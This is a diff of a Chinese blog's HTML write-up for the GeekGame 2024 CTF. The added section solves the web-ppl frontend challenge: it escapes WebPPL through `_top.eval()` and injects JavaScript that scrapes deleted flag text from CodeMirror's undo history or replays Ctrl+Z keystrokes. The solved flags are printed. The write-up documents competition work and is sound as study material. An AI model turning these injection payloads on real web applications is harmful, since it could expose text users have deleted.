@@ -256,7 +256,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">6.9k字</span>
+        <span class="post-count">7.3k字</span>
       </span>
     </span>
 
@@ -265,7 +265,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">37分</span>
+        <span class="post-count">39分</span>
       </span>
     </span>
     
@@ -364,7 +364,7 @@ zip_dir <span class="token operator">=</span> <span class="token string">'.'</sp
 	<span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">hackr</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>独立窗口分离控制台强行暂停调试</p>
+<p>独立窗口分离控制台然后强行暂停调试，猜测是验分辨率了</p>
 <p><img src="/blog/2024/10/13/GeekGame-2024/image-20241014124957663.png" alt="image-20241014124957663"></p>
 <p>可以看下html</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>centralBox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
@@ -471,7 +471,7 @@ all_values <span class="token operator">=</span> <span class="token string">''</
 <p>得到flag{h3lL0-Ics-4gaIN-e4sY-guaKe}</p>
 <hr>
 <h1 id="概率题目概率过-web-ppl"><a href="#概率题目概率过-web-ppl" class="headerlink" title="概率题目概率过 #web-ppl"></a>概率题目概率过 #web-ppl</h1><h2 id="前端（Unsolved）"><a href="#前端（Unsolved）" class="headerlink" title="前端（Unsolved）"></a>前端（Unsolved）</h2><blockquote>
-<p>如果你的注意力不够集中，浏览器开发者工具的 Heap snapshot 功能或许可以帮助你<br>前端使用的代码编辑器是 CodeMirror</p>
+<p>本题跟概率编程没有什么关系。在设法实现 eval 后就可以不管 WebPPL 了，后面的部分是在环境中拿 Flag 的 JavaScript 编程题。<br>如果你的注意力不够集中，浏览器开发者工具的 Heap snapshot 功能或许可以帮助你<br>前端使用的代码编辑器是 CodeMirror</p>
 </blockquote>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">challenge_1</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">try</span><span class="token punctuation">:</span>
@@ -510,6 +510,24 @@ all_values <span class="token operator">=</span> <span class="token string">''</
 <br>
 
 <p>好，思路完全错了</p>
+<p>这里应该先想办法实现 eval，在测试了许多遍之后发现我们不能单纯执行一个<code>eval</code></p>
+<p><img src="/blog/GeekGame-2024/image-20241021012009191.png" alt="image-20241021012009191"></p>
+<p>猜测这里做了点手脚，但是官方文档已经告诉了我们正确的做法：<a target="_blank" rel="noopener" href="https://webppl.readthedocs.io/en/master/language.html#calling-javascript-functions">https://webppl.readthedocs.io/en/master/language.html#calling-javascript-functions</a></p>
+<p>文档解释了所有形如 <code>foo()</code> 的函数调用都会被理解为对概率函数的调用，而形如 <code>foo.bar()</code> 这样的中间带点的方法调用则被认为是使用 JavaScript 库函数</p>
+<p>那就按照文档里给的示例，用 <code>_top</code>（是 <code>window</code> 的别名）来调用全局函数</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">_top<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么第二个问题，第一次写入并执行输出完 flag 后文本框的内容就被手动 del 了</p>
+<p>但是CodeMirror是会保存历史记录的，在<code>document.querySelector(&#39;.CodeMirror&#39;).CodeMirror.doc.history.done</code>中</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">_top<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"document.querySelector('.CodeMirror').CodeMirror.doc.history.done.forEach(d=>&#123;if(d.changes)d.changes.forEach(c=>&#123;let t = c.text.join('');if(t.includes('flag&#123;'))document.title = t;&#125;);&#125;);"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/GeekGame-2024/image-20241021020104541.png" alt="image-20241021020104541"></p>
+<p>flag{EVal-IS-EvIL-But-NEvEr-MinD}</p>
+<p>做crx做的：ctrl+z，但是自己模拟一下bot的操作撤销一个个字符的输入就会发现不大现实（</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">_top<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"let textarea = document.querySelector('.CodeMirror textarea');textarea.dispatchEvent(new KeyboardEvent('keydown', &#123;key: 'z',code: 'KeyZ',keyCode: 90,ctrlKey: true,shiftKey: false,altKey: false,metaKey: false,bubbles: true,cancelable: true&#125;));document.querySelectorAll('span.cm-string')[0].innerText;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <hr>
 <h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">challenge_2</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">if</span> <span class="token keyword">not</span> Path<span class="token punctuation">(</span><span class="token string">'/flag2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>is_file<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
